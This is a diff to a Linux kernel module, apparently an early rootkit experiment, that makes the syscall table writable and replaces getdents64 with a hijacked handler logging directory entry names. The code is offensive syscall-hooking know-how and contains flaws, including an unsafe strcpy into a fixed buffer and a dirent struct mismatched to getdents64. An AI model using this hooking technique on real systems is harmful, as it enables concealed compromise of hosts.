@@ -9,6 +9,23 @@
 #include <linux/version.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
+#include <linux/string.h>
+
+
+struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+                        /* length is actually (d_reclen - 2 -
+                           offsetof(struct linux_dirent, d_name) */
+    /*
+    char           pad;       // Zero padding byte
+    char           d_type;    // File type (only since Linux 2.6.4;
+                              // offset is (d_reclen - 1))
+    */
+
+};
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("1337");
@@ -20,10 +37,28 @@ unsigned long * sys_call_table;
 asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
 
 asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-	printk(KERN_INFO "getdents is called through hijacked call.\n");
-	unsigned long dirent_dino;
-	dirent_dino = dirp->d_ino;
-	printk(KERN_INFO "d_ino:%lu\n",dirent_dino);
+	printk(KERN_INFO "hijacked call.\n");
+	
+	//the following commented code, when uncommented, does not compile.
+	unsigned long dino,doff;
+	unsigned short dreclen;
+	char name[256];
+	dino = (unsigned long)dirp->d_ino;
+	doff = (unsigned long)dirp->d_off;
+	dreclen = (unsigned short)dirp->d_reclen;
+
+	strcpy(name,dirp->d_name);
+
+	//printk(KERN_INFO "d_ino:%lu\n",dino);
+
+	//printk(KERN_INFO "d_off:%lu\n",doff);
+	//printk(KERN_INFO "d_reclen:%u\n",dreclen);
+	printk(KERN_INFO "d_name:%s\n",name);
+	//int i = 0;
+	//for (i = 0; i < strlen(name); i++){
+	//	printk(KERN_INFO "%c", name[i]);
+	//}
+	//printk(KERN_INFO "\n");
 	return real_getdents(fd, dirp, count);
 }
 
@@ -47,7 +82,7 @@ int make_ro(unsigned long address){
 
 
 
-void hijack_sys_call_table(){
+void hijack_sys_call_table(void){
 	make_rw((unsigned long)sys_call_table);
         real_getdents = (void*)*(sys_call_table + __NR_getdents64);
         *(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents;
